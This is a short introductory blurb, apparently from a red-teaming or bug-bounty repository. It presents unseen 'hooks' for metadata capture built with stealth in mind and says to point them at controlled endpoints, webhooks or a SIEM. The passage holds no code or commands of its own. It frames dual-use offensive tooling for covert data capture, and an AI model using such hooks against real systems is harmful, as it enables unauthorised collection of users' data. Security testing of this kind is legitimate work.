üö® These Hooks are designed  for integration into security tooling, bug bounty automation, or red teaming infrastructure, or Advanced Analytics && Analysis. All hooks are designed with advanced metadata capture and stealth in mind. We can adapt them for use in platforms like Burp Suite, Zap, custom Python/Node.js listeners, or web application assessments.

**How to Use:**  
- Replace the `{{placeholders}}` with your tool's dynamic variables or captured data.
- These hooks can be endpoints you control, or integrations with your SIEM, webhook receivers, or analytic dashboards.
- For actual deployment, always secure such endpoints (auth, rate limiting, logging, etc.) to avoid abuse.
